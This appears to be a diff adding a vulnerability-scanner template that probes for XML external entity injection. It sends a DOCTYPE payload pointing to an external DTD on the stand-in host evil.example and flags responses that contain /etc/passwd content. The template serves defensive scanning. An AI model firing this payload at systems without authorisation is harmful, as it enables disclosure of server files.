@@ -1,0 +1,21 @@
+id: xxe-022
+name: 'XXE via data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via data'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<!DOCTYPE r PUBLIC "-//X//EN" "http://evil.example/dtd"><r>x</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
